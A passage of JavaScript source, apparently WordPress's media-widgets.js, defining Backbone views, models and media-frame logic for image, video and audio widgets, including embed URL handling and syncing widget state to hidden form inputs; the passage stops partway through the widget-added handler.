/**
 * @output wp-admin/js/widgets/media-widgets.js
 */

/* eslint consistent-this: [ "error", "control" ] */

/**
 * @namespace wp.mediaWidgets
 * @memberOf  wp
 */
wp.mediaWidgets = ( function( $ ) {
	'use strict';

	var component = {};

	/**
	 * Widget control (view) constructors, mapping widget id_base to subclass of MediaWidgetControl.
	 *
	 * Media widgets register themselves by assigning subclasses of MediaWidgetControl onto this object by widget ID base.
	 *
	 * @memberOf wp.mediaWidgets
	 *
	 * @type {Object.<string, wp.mediaWidgets.MediaWidgetModel>}
	 */
	component.controlConstructors = {};

	/**
	 * Widget model constructors, mapping widget id_base to subclass of MediaWidgetModel.
	 *
	 * Media widgets register themselves by assigning subclasses of MediaWidgetControl onto this object by widget ID base.
	 *
	 * @memberOf wp.mediaWidgets
	 *
	 * @type {Object.<string, wp.mediaWidgets.MediaWidgetModel>}
	 */
	component.modelConstructors = {};

	component.PersistentDisplaySettingsLibrary = wp.media.controller.Library.extend(/** @lends wp.mediaWidgets.PersistentDisplaySettingsLibrary.prototype */{

		/**
		 * Library which persists the customized display settings across selections.
		 *
		 * @constructs wp.mediaWidgets.PersistentDisplaySettingsLibrary
		 * @augments   wp.media.controller.Library
		 *
		 * @param {Object} options - Options.
		 *
		 * @return {void}
		 */
		initialize: function initialize( options ) {
			_.bindAll( this, 'handleDisplaySettingChange' );
			wp.media.controller.Library.prototype.initialize.call( this, options );
		},

		/**
		 * Sync changes to the current display settings back into the current customized.
		 *
		 * @param {Backbone.Model} displaySettings - Modified display settings.
		 * @return {void}
		 */
		handleDisplaySettingChange: function handleDisplaySettingChange( displaySettings ) {
			this.get( 'selectedDisplaySettings' ).set( displaySettings.attributes );
		},

		/**
		 * Get the display settings model.
		 *
		 * Model returned is updated with the current customized display settings,
		 * and an event listener is added so that changes made to the settings
		 * will sync back into the model storing the session's customized display
		 * settings.
		 *
		 * @param {Backbone.Model} model - Display settings model.
		 * @return {Backbone.Model} Display settings model.
		 */
		display: function getDisplaySettingsModel( model ) {
			var display, selectedDisplaySettings = this.get( 'selectedDisplaySettings' );
			display = wp.media.controller.Library.prototype.display.call( this, model );

			display.off( 'change', this.handleDisplaySettingChange ); // Prevent duplicated event handlers.
			display.set( selectedDisplaySettings.attributes );
			if ( 'custom' === selectedDisplaySettings.get( 'link_type' ) ) {
				display.linkUrl = selectedDisplaySettings.get( 'link_url' );
			}
			display.on( 'change', this.handleDisplaySettingChange );
			return display;
		}
	});

	/**
	 * Extended view for managing the embed UI.
	 *
	 * @class    wp.mediaWidgets.MediaEmbedView
	 * @augments wp.media.view.Embed
	 */
	component.MediaEmbedView = wp.media.view.Embed.extend(/** @lends wp.mediaWidgets.MediaEmbedView.prototype */{

		/**
		 * Initialize.
		 *
		 * @since 4.9.0
		 *
		 * @param {Object} options - Options.
		 * @return {void}
		 */
		initialize: function( options ) {
			var view = this, embedController; // eslint-disable-line consistent-this
			wp.media.view.Embed.prototype.initialize.call( view, options );
			if ( 'image' !== view.controller.options.mimeType ) {
				embedController = view.controller.states.get( 'embed' );
				embedController.off( 'scan', embedController.scanImage, embedController );
			}
		},

		/**
		 * Refresh embed view.
		 *
		 * Forked override of {wp.media.view.Embed#refresh()} to suppress irrelevant "link text" field.
		 *
		 * @return {void}
		 */
		refresh: function refresh() {
			/**
			 * @class wp.mediaWidgets~Constructor
			 */
			var Constructor;

			if ( 'image' === this.controller.options.mimeType ) {
				Constructor = wp.media.view.EmbedImage;
			} else {

				// This should be eliminated once #40450 lands of when this is merged into core.
				Constructor = wp.media.view.EmbedLink.extend(/** @lends wp.mediaWidgets~Constructor.prototype */{

					/**
					 * Set the disabled state on the Add to Widget button.
					 *
					 * @param {boolean} disabled - Disabled.
					 * @return {void}
					 */
					setAddToWidgetButtonDisabled: function setAddToWidgetButtonDisabled( disabled ) {
						this.views.parent.views.parent.views.get( '.media-frame-toolbar' )[0].$el.find( '.media-button-select' ).prop( 'disabled', disabled );
					},

					/**
					 * Set or clear an error notice.
					 *
					 * @param {string} notice - Notice.
					 * @return {void}
					 */
					setErrorNotice: function setErrorNotice( notice ) {
						var embedLinkView = this, noticeContainer; // eslint-disable-line consistent-this

						noticeContainer = embedLinkView.views.parent.$el.find( '> .notice:first-child' );
						if ( ! notice ) {
							if ( noticeContainer.length ) {
								noticeContainer.slideUp( 'fast' );
							}
						} else {
							if ( ! noticeContainer.length ) {
								noticeContainer = $( '<div class="media-widget-embed-notice notice notice-error notice-alt"></div>' );
								noticeContainer.hide();
								embedLinkView.views.parent.$el.prepend( noticeContainer );
							}
							noticeContainer.empty();
							noticeContainer.append( $( '<p>', {
								html: notice
							}));
							noticeContainer.slideDown( 'fast' );
						}
					},

					/**
					 * Update oEmbed.
					 *
					 * @since 4.9.0
					 *
					 * @return {void}
					 */
					updateoEmbed: function() {
						var embedLinkView = this, url; // eslint-disable-line consistent-this

						url = embedLinkView.model.get( 'url' );

						// Abort if the URL field was emptied out.
						if ( ! url ) {
							embedLinkView.setErrorNotice( '' );
							embedLinkView.setAddToWidgetButtonDisabled( true );
							return;
						}

						if ( ! url.match( /^(http|https):\/\/.+\// ) ) {
							embedLinkView.controller.$el.find( '#embed-url-field' ).addClass( 'invalid' );
							embedLinkView.setAddToWidgetButtonDisabled( true );
						}

						wp.media.view.EmbedLink.prototype.updateoEmbed.call( embedLinkView );
					},

					/**
					 * Fetch media.
					 *
					 * @return {void}
					 */
					fetch: function() {
						var embedLinkView = this, fetchSuccess, matches, fileExt, urlParser, url, re, youTubeEmbedMatch; // eslint-disable-line consistent-this
						url = embedLinkView.model.get( 'url' );

						if ( embedLinkView.dfd && 'pending' === embedLinkView.dfd.state() ) {
							embedLinkView.dfd.abort();
						}

						fetchSuccess = function( response ) {
							embedLinkView.renderoEmbed({
								data: {
									body: response
								}
							});

							embedLinkView.controller.$el.find( '#embed-url-field' ).removeClass( 'invalid' );
							embedLinkView.setErrorNotice( '' );
							embedLinkView.setAddToWidgetButtonDisabled( false );
						};

						urlParser = document.createElement( 'a' );
						urlParser.href = url;
						matches = urlParser.pathname.toLowerCase().match( /\.(\w+)$/ );
						if ( matches ) {
							fileExt = matches[1];
							if ( ! wp.media.view.settings.embedMimes[ fileExt ] ) {
								embedLinkView.renderFail();
							} else if ( 0 !== wp.media.view.settings.embedMimes[ fileExt ].indexOf( embedLinkView.controller.options.mimeType ) ) {
								embedLinkView.renderFail();
							} else {
								fetchSuccess( '<!--success-->' );
							}
							return;
						}

						// Support YouTube embed links.
						re = /https?:\/\/www\.youtube\.com\/embed\/([^/]+)/;
						youTubeEmbedMatch = re.exec( url );
						if ( youTubeEmbedMatch ) {
							url = 'https://www.youtube.com/watch?v=' + youTubeEmbedMatch[ 1 ];
							// silently change url to proper oembed-able version.
							embedLinkView.model.attributes.url = url;
						}

						embedLinkView.dfd = wp.apiRequest({
							url: wp.media.view.settings.oEmbedProxyUrl,
							data: {
								url: url,
								maxwidth: embedLinkView.model.get( 'width' ),
								maxheight: embedLinkView.model.get( 'height' ),
								discover: false
							},
							type: 'GET',
							dataType: 'json',
							context: embedLinkView
						});

						embedLinkView.dfd.done( function( response ) {
							if ( embedLinkView.controller.options.mimeType !== response.type ) {
								embedLinkView.renderFail();
								return;
							}
							fetchSuccess( response.html );
						});
						embedLinkView.dfd.fail( _.bind( embedLinkView.renderFail, embedLinkView ) );
					},

					/**
					 * Handle render failure.
					 *
					 * Overrides the {EmbedLink#renderFail()} method to prevent showing the "Link Text" field.
					 * The element is getting display:none in the stylesheet, but the underlying method uses
					 * uses {jQuery.fn.show()} which adds an inline style. This avoids the need for !important.
					 *
					 * @return {void}
					 */
					renderFail: function renderFail() {
						var embedLinkView = this; // eslint-disable-line consistent-this
						embedLinkView.controller.$el.find( '#embed-url-field' ).addClass( 'invalid' );
						embedLinkView.setErrorNotice( embedLinkView.controller.options.invalidEmbedTypeError || 'ERROR' );
						embedLinkView.setAddToWidgetButtonDisabled( true );
					}
				});
			}

			this.settings( new Constructor({
				controller: this.controller,
				model:      this.model.props,
				priority:   40
			}));
		}
	});

	/**
	 * Custom media frame for selecting uploaded media or providing media by URL.
	 *
	 * @class    wp.mediaWidgets.MediaFrameSelect
	 * @augments wp.media.view.MediaFrame.Post
	 */
	component.MediaFrameSelect = wp.media.view.MediaFrame.Post.extend(/** @lends wp.mediaWidgets.MediaFrameSelect.prototype */{

		/**
		 * Create the default states.
		 *
		 * @return {void}
		 */
		createStates: function createStates() {
			var mime = this.options.mimeType, specificMimes = [];
			_.each( wp.media.view.settings.embedMimes, function( embedMime ) {
				if ( 0 === embedMime.indexOf( mime ) ) {
					specificMimes.push( embedMime );
				}
			});
			if ( specificMimes.length > 0 ) {
				mime = specificMimes;
			}

			this.states.add([

				// Main states.
				new component.PersistentDisplaySettingsLibrary({
					id:         'insert',
					title:      this.options.title,
					selection:  this.options.selection,
					priority:   20,
					toolbar:    'main-insert',
					filterable: 'dates',
					library:    wp.media.query({
						type: mime
					}),
					multiple:   false,
					editable:   true,

					selectedDisplaySettings: this.options.selectedDisplaySettings,
					displaySettings: _.isUndefined( this.options.showDisplaySettings ) ? true : this.options.showDisplaySettings,
					displayUserSettings: false // We use the display settings from the current/default widget instance props.
				}),

				new wp.media.controller.EditImage({ model: this.options.editImage }),

				// Embed states.
				new wp.media.controller.Embed({
					metadata: this.options.metadata,
					type: 'image' === this.options.mimeType ? 'image' : 'link',
					invalidEmbedTypeError: this.options.invalidEmbedTypeError
				})
			]);
		},

		/**
		 * Main insert toolbar.
		 *
		 * Forked override of {wp.media.view.MediaFrame.Post#mainInsertToolbar()} to override text.
		 *
		 * @param {wp.Backbone.View} view - Toolbar view.
		 * @this {wp.media.controller.Library}
		 * @return {void}
		 */
		mainInsertToolbar: function mainInsertToolbar( view ) {
			var controller = this; // eslint-disable-line consistent-this
			view.set( 'insert', {
				style:    'primary',
				priority: 80,
				text:     controller.options.text, // The whole reason for the fork.
				requires: { selection: true },

				/**
				 * Handle click.
				 *
				 * @ignore
				 *
				 * @fires wp.media.controller.State#insert()
				 * @return {void}
				 */
				click: function onClick() {
					var state = controller.state(),
						selection = state.get( 'selection' );

					controller.close();
					state.trigger( 'insert', selection ).reset();
				}
			});
		},

		/**
		 * Main embed toolbar.
		 *
		 * Forked override of {wp.media.view.MediaFrame.Post#mainEmbedToolbar()} to override text.
		 *
		 * @param {wp.Backbone.View} toolbar - Toolbar view.
		 * @this {wp.media.controller.Library}
		 * @return {void}
		 */
		mainEmbedToolbar: function mainEmbedToolbar( toolbar ) {
			toolbar.view = new wp.media.view.Toolbar.Embed({
				controller: this,
				text: this.options.text,
				event: 'insert'
			});
		},

		/**
		 * Embed content.
		 *
		 * Forked override of {wp.media.view.MediaFrame.Post#embedContent()} to suppress irrelevant "link text" field.
		 *
		 * @return {void}
		 */
		embedContent: function embedContent() {
			var view = new component.MediaEmbedView({
				controller: this,
				model:      this.state()
			}).render();

			this.content.set( view );
		}
	});

	component.MediaWidgetControl = Backbone.View.extend(/** @lends wp.mediaWidgets.MediaWidgetControl.prototype */{

		/**
		 * Translation strings.
		 *
		 * The mapping of translation strings is handled by media widget subclasses,
		 * exported from PHP to JS such as is done in WP_Widget_Media_Image::enqueue_admin_scripts().
		 *
		 * @type {Object}
		 */
		l10n: {
			add_to_widget: '{{add_to_widget}}',
			add_media: '{{add_media}}'
		},

		/**
		 * Widget ID base.
		 *
		 * This may be defined by the subclass. It may be exported from PHP to JS
		 * such as is done in WP_Widget_Media_Image::enqueue_admin_scripts(). If not,
		 * it will attempt to be discovered by looking to see if this control
		 * instance extends each member of component.controlConstructors, and if
		 * it does extend one, will use the key as the id_base.
		 *
		 * @type {string}
		 */
		id_base: '',

		/**
		 * Mime type.
		 *
		 * This must be defined by the subclass. It may be exported from PHP to JS
		 * such as is done in WP_Widget_Media_Image::enqueue_admin_scripts().
		 *
		 * @type {string}
		 */
		mime_type: '',

		/**
		 * View events.
		 *
		 * @type {Object}
		 */
		events: {
			'click .notice-missing-attachment a': 'handleMediaLibraryLinkClick',
			'click .select-media': 'selectMedia',
			'click .placeholder': 'selectMedia',
			'click .edit-media': 'editMedia'
		},

		/**
		 * Show display settings.
		 *
		 * @type {boolean}
		 */
		showDisplaySettings: true,

		/**
		 * Media Widget Control.
		 *
		 * @constructs wp.mediaWidgets.MediaWidgetControl
		 * @augments   Backbone.View
		 * @abstract
		 *
		 * @param {Object}         options - Options.
		 * @param {Backbone.Model} options.model - Model.
		 * @param {jQuery}         options.el - Control field container element.
		 * @param {jQuery}         options.syncContainer - Container element where fields are synced for the server.
		 *
		 * @return {void}
		 */
		initialize: function initialize( options ) {
			var control = this;

			Backbone.View.prototype.initialize.call( control, options );

			if ( ! ( control.model instanceof component.MediaWidgetModel ) ) {
				throw new Error( 'Missing options.model' );
			}
			if ( ! options.el ) {
				throw new Error( 'Missing options.el' );
			}
			if ( ! options.syncContainer ) {
				throw new Error( 'Missing options.syncContainer' );
			}

			control.syncContainer = options.syncContainer;

			control.$el.addClass( 'media-widget-control' );

			// Allow methods to be passed in with control context preserved.
			_.bindAll( control, 'syncModelToInputs', 'render', 'updateSelectedAttachment', 'renderPreview' );

			if ( ! control.id_base ) {
				_.find( component.controlConstructors, function( Constructor, idBase ) {
					if ( control instanceof Constructor ) {
						control.id_base = idBase;
						return true;
					}
					return false;
				});
				if ( ! control.id_base ) {
					throw new Error( 'Missing id_base.' );
				}
			}

			// Track attributes needed to renderPreview in it's own model.
			control.previewTemplateProps = new Backbone.Model( control.mapModelToPreviewTemplateProps() );

			// Re-render the preview when the attachment changes.
			control.selectedAttachment = new wp.media.model.Attachment();
			control.renderPreview = _.debounce( control.renderPreview );
			control.listenTo( control.previewTemplateProps, 'change', control.renderPreview );

			// Make sure a copy of the selected attachment is always fetched.
			control.model.on( 'change:attachment_id', control.updateSelectedAttachment );
			control.model.on( 'change:url', control.updateSelectedAttachment );
			control.updateSelectedAttachment();

			/*
			 * Sync the widget instance model attributes onto the hidden inputs that widgets currently use to store the state.
			 * In the future, when widgets are JS-driven, the underlying widget instance data should be exposed as a model
			 * from the start, without having to sync with hidden fields. See <https://core.trac.wordpress.org/ticket/33507>.
			 */
			control.listenTo( control.model, 'change', control.syncModelToInputs );
			control.listenTo( control.model, 'change', control.syncModelToPreviewProps );
			control.listenTo( control.model, 'change', control.render );

			// Update the title.
			control.$el.on( 'input change', '.title', function updateTitle() {
				control.model.set({
					title: $( this ).val().trim()
				});
			});

			// Update link_url attribute.
			control.$el.on( 'input change', '.link', function updateLinkUrl() {
				var linkUrl = $( this ).val().trim(), linkType = 'custom';
				if ( control.selectedAttachment.get( 'linkUrl' ) === linkUrl || control.selectedAttachment.get( 'link' ) === linkUrl ) {
					linkType = 'post';
				} else if ( control.selectedAttachment.get( 'url' ) === linkUrl ) {
					linkType = 'file';
				}
				control.model.set( {
					link_url: linkUrl,
					link_type: linkType
				});

				// Update display settings for the next time the user opens to select from the media library.
				control.displaySettings.set( {
					link: linkType,
					linkUrl: linkUrl
				});
			});

			/*
			 * Copy current display settings from the widget model to serve as basis
			 * of customized display settings for the current media frame session.
			 * Changes to display settings will be synced into this model, and
			 * when a new selection is made, the settings from this will be synced
			 * into that AttachmentDisplay's model to persist the setting changes.
			 */
			control.displaySettings = new Backbone.Model( _.pick(
				control.mapModelToMediaFrameProps(
					_.extend( control.model.defaults(), control.model.toJSON() )
				),
				_.keys( wp.media.view.settings.defaultProps )
			) );
		},

		/**
		 * Update the selected attachment if necessary.
		 *
		 * @return {void}
		 */
		updateSelectedAttachment: function updateSelectedAttachment() {
			var control = this, attachment;

			if ( 0 === control.model.get( 'attachment_id' ) ) {
				control.selectedAttachment.clear();
				control.model.set( 'error', false );
			} else if ( control.model.get( 'attachment_id' ) !== control.selectedAttachment.get( 'id' ) ) {
				attachment = new wp.media.model.Attachment({
					id: control.model.get( 'attachment_id' )
				});
				attachment.fetch()
					.done( function done() {
						control.model.set( 'error', false );
						control.selectedAttachment.set( attachment.toJSON() );
					})
					.fail( function fail() {
						control.model.set( 'error', 'missing_attachment' );
					});
			}
		},

		/**
		 * Sync the model attributes to the hidden inputs, and update previewTemplateProps.
		 *
		 * @return {void}
		 */
		syncModelToPreviewProps: function syncModelToPreviewProps() {
			var control = this;
			control.previewTemplateProps.set( control.mapModelToPreviewTemplateProps() );
		},

		/**
		 * Sync the model attributes to the hidden inputs, and update previewTemplateProps.
		 *
		 * @return {void}
		 */
		syncModelToInputs: function syncModelToInputs() {
			var control = this;
			control.syncContainer.find( '.media-widget-instance-property' ).each( function() {
				var input = $( this ), value, propertyName;
				propertyName = input.data( 'property' );
				value = control.model.get( propertyName );
				if ( _.isUndefined( value ) ) {
					return;
				}

				if ( 'array' === control.model.schema[ propertyName ].type && _.isArray( value ) ) {
					value = value.join( ',' );
				} else if ( 'boolean' === control.model.schema[ propertyName ].type ) {
					value = value ? '1' : ''; // Because in PHP, strval( true ) === '1' && strval( false ) === ''.
				} else {
					value = String( value );
				}

				if ( input.val() !== value ) {
					input.val( value );
					input.trigger( 'change' );
				}
			});
		},

		/**
		 * Get template.
		 *
		 * @return {Function} Template.
		 */
		template: function template() {
			var control = this;
			if ( ! $( '#tmpl-widget-media-' + control.id_base + '-control' ).length ) {
				throw new Error( 'Missing widget control template for ' + control.id_base );
			}
			return wp.template( 'widget-media-' + control.id_base + '-control' );
		},

		/**
		 * Render template.
		 *
		 * @return {void}
		 */
		render: function render() {
			var control = this, titleInput;

			if ( ! control.templateRendered ) {
				control.$el.html( control.template()( control.model.toJSON() ) );
				control.renderPreview(); // Hereafter it will re-render when control.selectedAttachment changes.
				control.templateRendered = true;
			}

			titleInput = control.$el.find( '.title' );
			if ( ! titleInput.is( document.activeElement ) ) {
				titleInput.val( control.model.get( 'title' ) );
			}

			control.$el.toggleClass( 'selected', control.isSelected() );
		},

		/**
		 * Render media preview.
		 *
		 * @abstract
		 * @return {void}
		 */
		renderPreview: function renderPreview() {
			throw new Error( 'renderPreview must be implemented' );
		},

		/**
		 * Whether a media item is selected.
		 *
		 * @return {boolean} Whether selected and no error.
		 */
		isSelected: function isSelected() {
			var control = this;

			if ( control.model.get( 'error' ) ) {
				return false;
			}

			return Boolean( control.model.get( 'attachment_id' ) || control.model.get( 'url' ) );
		},

		/**
		 * Handle click on link to Media Library to open modal, such as the link that appears when in the missing attachment error notice.
		 *
		 * @param {jQuery.Event} event - Event.
		 * @return {void}
		 */
		handleMediaLibraryLinkClick: function handleMediaLibraryLinkClick( event ) {
			var control = this;
			event.preventDefault();
			control.selectMedia();
		},

		/**
		 * Open the media select frame to chose an item.
		 *
		 * @return {void}
		 */
		selectMedia: function selectMedia() {
			var control = this, selection, mediaFrame, defaultSync, mediaFrameProps, selectionModels = [];

			if ( control.isSelected() && 0 !== control.model.get( 'attachment_id' ) ) {
				selectionModels.push( control.selectedAttachment );
			}

			selection = new wp.media.model.Selection( selectionModels, { multiple: false } );

			mediaFrameProps = control.mapModelToMediaFrameProps( control.model.toJSON() );
			if ( mediaFrameProps.size ) {
				control.displaySettings.set( 'size', mediaFrameProps.size );
			}

			mediaFrame = new component.MediaFrameSelect({
				title: control.l10n.add_media,
				frame: 'post',
				text: control.l10n.add_to_widget,
				selection: selection,
				mimeType: control.mime_type,
				selectedDisplaySettings: control.displaySettings,
				showDisplaySettings: control.showDisplaySettings,
				metadata: mediaFrameProps,
				state: control.isSelected() && 0 === control.model.get( 'attachment_id' ) ? 'embed' : 'insert',
				invalidEmbedTypeError: control.l10n.unsupported_file_type
			});
			wp.media.frame = mediaFrame; // See wp.media().

			// Handle selection of a media item.
			mediaFrame.on( 'insert', function onInsert() {
				var attachment = {}, state = mediaFrame.state();

				// Update cached attachment object to avoid having to re-fetch. This also triggers re-rendering of preview.
				if ( 'embed' === state.get( 'id' ) ) {
					_.extend( attachment, { id: 0 }, state.props.toJSON() );
				} else {
					_.extend( attachment, state.get( 'selection' ).first().toJSON() );
				}

				control.selectedAttachment.set( attachment );
				control.model.set( 'error', false );

				// Update widget instance.
				control.model.set( control.getModelPropsFromMediaFrame( mediaFrame ) );
			});

			// Disable syncing of attachment changes back to server (except for deletions). See <https://core.trac.wordpress.org/ticket/40403>.
			defaultSync = wp.media.model.Attachment.prototype.sync;
			wp.media.model.Attachment.prototype.sync = function( method ) {
				if ( 'delete' === method ) {
					return defaultSync.apply( this, arguments );
				} else {
					return $.Deferred().rejectWith( this ).promise();
				}
			};
			mediaFrame.on( 'close', function onClose() {
				wp.media.model.Attachment.prototype.sync = defaultSync;
			});

			mediaFrame.$el.addClass( 'media-widget' );
			mediaFrame.open();

			// Clear the selected attachment when it is deleted in the media select frame.
			if ( selection ) {
				selection.on( 'destroy', function onDestroy( attachment ) {
					if ( control.model.get( 'attachment_id' ) === attachment.get( 'id' ) ) {
						control.model.set({
							attachment_id: 0,
							url: ''
						});
					}
				});
			}

			/*
			 * Make sure focus is set inside of modal so that hitting Esc will close
			 * the modal and not inadvertently cause the widget to collapse in the customizer.
			 */
			mediaFrame.$el.find( '.media-frame-menu .media-menu-item.active' ).focus();
		},

		/**
		 * Get the instance props from the media selection frame.
		 *
		 * @param {wp.media.view.MediaFrame.Select} mediaFrame - Select frame.
		 * @return {Object} Props.
		 */
		getModelPropsFromMediaFrame: function getModelPropsFromMediaFrame( mediaFrame ) {
			var control = this, state, mediaFrameProps, modelProps;

			state = mediaFrame.state();
			if ( 'insert' === state.get( 'id' ) ) {
				mediaFrameProps = state.get( 'selection' ).first().toJSON();
				mediaFrameProps.postUrl = mediaFrameProps.link;

				if ( control.showDisplaySettings ) {
					_.extend(
						mediaFrameProps,
						mediaFrame.content.get( '.attachments-browser' ).sidebar.get( 'display' ).model.toJSON()
					);
				}
				if ( mediaFrameProps.sizes && mediaFrameProps.size && mediaFrameProps.sizes[ mediaFrameProps.size ] ) {
					mediaFrameProps.url = mediaFrameProps.sizes[ mediaFrameProps.size ].url;
				}
			} else if ( 'embed' === state.get( 'id' ) ) {
				mediaFrameProps = _.extend(
					state.props.toJSON(),
					{ attachment_id: 0 }, // Because some media frames use `attachment_id` not `id`.
					control.model.getEmbedResetProps()
				);
			} else {
				throw new Error( 'Unexpected state: ' + state.get( 'id' ) );
			}

			if ( mediaFrameProps.id ) {
				mediaFrameProps.attachment_id = mediaFrameProps.id;
			}

			modelProps = control.mapMediaToModelProps( mediaFrameProps );

			// Clear the extension prop so sources will be reset for video and audio media.
			_.each( wp.media.view.settings.embedExts, function( ext ) {
				if ( ext in control.model.schema && modelProps.url !== modelProps[ ext ] ) {
					modelProps[ ext ] = '';
				}
			});

			return modelProps;
		},

		/**
		 * Map media frame props to model props.
		 *
		 * @param {Object} mediaFrameProps - Media frame props.
		 * @return {Object} Model props.
		 */
		mapMediaToModelProps: function mapMediaToModelProps( mediaFrameProps ) {
			var control = this, mediaFramePropToModelPropMap = {}, modelProps = {}, extension;
			_.each( control.model.schema, function( fieldSchema, modelProp ) {

				// Ignore widget title attribute.
				if ( 'title' === modelProp ) {
					return;
				}
				mediaFramePropToModelPropMap[ fieldSchema.media_prop || modelProp ] = modelProp;
			});

			_.each( mediaFrameProps, function( value, mediaProp ) {
				var propName = mediaFramePropToModelPropMap[ mediaProp ] || mediaProp;
				if ( control.model.schema[ propName ] ) {
					modelProps[ propName ] = value;
				}
			});

			if ( 'custom' === mediaFrameProps.size ) {
				modelProps.width = mediaFrameProps.customWidth;
				modelProps.height = mediaFrameProps.customHeight;
			}

			if ( 'post' === mediaFrameProps.link ) {
				modelProps.link_url = mediaFrameProps.postUrl || mediaFrameProps.linkUrl;
			} else if ( 'file' === mediaFrameProps.link ) {
				modelProps.link_url = mediaFrameProps.url;
			}

			// Because some media frames use `id` instead of `attachment_id`.
			if ( ! mediaFrameProps.attachment_id && mediaFrameProps.id ) {
				modelProps.attachment_id = mediaFrameProps.id;
			}

			if ( mediaFrameProps.url ) {
				extension = mediaFrameProps.url.replace( /#.*$/, '' ).replace( /\?.*$/, '' ).split( '.' ).pop().toLowerCase();
				if ( extension in control.model.schema ) {
					modelProps[ extension ] = mediaFrameProps.url;
				}
			}

			// Always omit the titles derived from mediaFrameProps.
			return _.omit( modelProps, 'title' );
		},

		/**
		 * Map model props to media frame props.
		 *
		 * @param {Object} modelProps - Model props.
		 * @return {Object} Media frame props.
		 */
		mapModelToMediaFrameProps: function mapModelToMediaFrameProps( modelProps ) {
			var control = this, mediaFrameProps = {};

			_.each( modelProps, function( value, modelProp ) {
				var fieldSchema = control.model.schema[ modelProp ] || {};
				mediaFrameProps[ fieldSchema.media_prop || modelProp ] = value;
			});

			// Some media frames use attachment_id.
			mediaFrameProps.attachment_id = mediaFrameProps.id;

			if ( 'custom' === mediaFrameProps.size ) {
				mediaFrameProps.customWidth = control.model.get( 'width' );
				mediaFrameProps.customHeight = control.model.get( 'height' );
			}

			return mediaFrameProps;
		},

		/**
		 * Map model props to previewTemplateProps.
		 *
		 * @return {Object} Preview Template Props.
		 */
		mapModelToPreviewTemplateProps: function mapModelToPreviewTemplateProps() {
			var control = this, previewTemplateProps = {};
			_.each( control.model.schema, function( value, prop ) {
				if ( ! value.hasOwnProperty( 'should_preview_update' ) || value.should_preview_update ) {
					previewTemplateProps[ prop ] = control.model.get( prop );
				}
			});

			// Templates need to be aware of the error.
			previewTemplateProps.error = control.model.get( 'error' );
			return previewTemplateProps;
		},

		/**
		 * Open the media frame to modify the selected item.
		 *
		 * @abstract
		 * @return {void}
		 */
		editMedia: function editMedia() {
			throw new Error( 'editMedia not implemented' );
		}
	});

	/**
	 * Media widget model.
	 *
	 * @class    wp.mediaWidgets.MediaWidgetModel
	 * @augments Backbone.Model
	 */
	component.MediaWidgetModel = Backbone.Model.extend(/** @lends wp.mediaWidgets.MediaWidgetModel.prototype */{

		/**
		 * Id attribute.
		 *
		 * @type {string}
		 */
		idAttribute: 'widget_id',

		/**
		 * Instance schema.
		 *
		 * This adheres to JSON Schema and subclasses should have their schema
		 * exported from PHP to JS such as is done in WP_Widget_Media_Image::enqueue_admin_scripts().
		 *
		 * @type {Object.<string, Object>}
		 */
		schema: {
			title: {
				type: 'string',
				'default': ''
			},
			attachment_id: {
				type: 'integer',
				'default': 0
			},
			url: {
				type: 'string',
				'default': ''
			}
		},

		/**
		 * Get default attribute values.
		 *
		 * @return {Object} Mapping of property names to their default values.
		 */
		defaults: function() {
			var defaults = {};
			_.each( this.schema, function( fieldSchema, field ) {
				defaults[ field ] = fieldSchema['default'];
			});
			return defaults;
		},

		/**
		 * Set attribute value(s).
		 *
		 * This is a wrapped version of Backbone.Model#set() which allows us to
		 * cast the attribute values from the hidden inputs' string values into
		 * the appropriate data types (integers or booleans).
		 *
		 * @param {string|Object} key - Attribute name or attribute pairs.
		 * @param {mixed|Object}  [val] - Attribute value or options object.
		 * @param {Object}        [options] - Options when attribute name and value are passed separately.
		 * @return {wp.mediaWidgets.MediaWidgetModel} This model.
		 */
		set: function set( key, val, options ) {
			var model = this, attrs, opts, castedAttrs; // eslint-disable-line consistent-this
			if ( null === key ) {
				return model;
			}
			if ( 'object' === typeof key ) {
				attrs = key;
				opts = val;
			} else {
				attrs = {};
				attrs[ key ] = val;
				opts = options;
			}

			castedAttrs = {};
			_.each( attrs, function( value, name ) {
				var type;
				if ( ! model.schema[ name ] ) {
					castedAttrs[ name ] = value;
					return;
				}
				type = model.schema[ name ].type;
				if ( 'array' === type ) {
					castedAttrs[ name ] = value;
					if ( ! _.isArray( castedAttrs[ name ] ) ) {
						castedAttrs[ name ] = castedAttrs[ name ].split( /,/ ); // Good enough for parsing an ID list.
					}
					if ( model.schema[ name ].items && 'integer' === model.schema[ name ].items.type ) {
						castedAttrs[ name ] = _.filter(
							_.map( castedAttrs[ name ], function( id ) {
								return parseInt( id, 10 );
							},
							function( id ) {
								return 'number' === typeof id;
							}
						) );
					}
				} else if ( 'integer' === type ) {
					castedAttrs[ name ] = parseInt( value, 10 );
				} else if ( 'boolean' === type ) {
					castedAttrs[ name ] = ! ( ! value || '0' === value || 'false' === value );
				} else {
					castedAttrs[ name ] = value;
				}
			});

			return Backbone.Model.prototype.set.call( this, castedAttrs, opts );
		},

		/**
		 * Get props which are merged on top of the model when an embed is chosen (as opposed to an attachment).
		 *
		 * @return {Object} Reset/override props.
		 */
		getEmbedResetProps: function getEmbedResetProps() {
			return {
				id: 0
			};
		}
	});

	/**
	 * Collection of all widget model instances.
	 *
	 * @memberOf wp.mediaWidgets
	 *
	 * @type {Backbone.Collection}
	 */
	component.modelCollection = new ( Backbone.Collection.extend( {
		model: component.MediaWidgetModel
	}) )();

	/**
	 * Mapping of widget ID to instances of MediaWidgetControl subclasses.
	 *
	 * @memberOf wp.mediaWidgets
	 *
	 * @type {Object.<string, wp.mediaWidgets.MediaWidgetControl>}
	 */
	component.widgetControls = {};

	/**
	 * Handle widget being added or initialized for the first time at the widget-added event.
	 *
	 * @memberOf wp.mediaWidgets
	 *
	 * @param {jQuery.Event} event - Event.
	 * @param {jQuery}       widgetContainer - Widget container element.
	 *
	 * @return {void}
	 */
	component.handleWidgetAdded = function handleWidgetAdded( event, widgetContainer ) {
		var fieldContainer, syncContainer, widgetForm, idBase, ControlConstructor, ModelConstructor, modelAttributes, widgetControl, widgetModel, widgetId, animatedCheckDelay = 50, renderWhenAnimationDone;
		widgetForm = widgetContainer.find( '> .widget-inside > .form, > .widget-inside > form' ); // Note: '.form' appears in the customizer, whereas 'form' on the widgets admin screen.
		idBase = widgetForm.find( '> .id_base' ).val();
		widgetId = widgetForm.find( '> .widget-id' ).val();

		// Prevent initializing already-added widgets.
		if ( component.widgetControls[ widgetId ] ) {
			return;
		}

		ControlConstructor = component.controlConstructors[ idBase ];
		if ( ! ControlConstructor ) {
			return;
		}

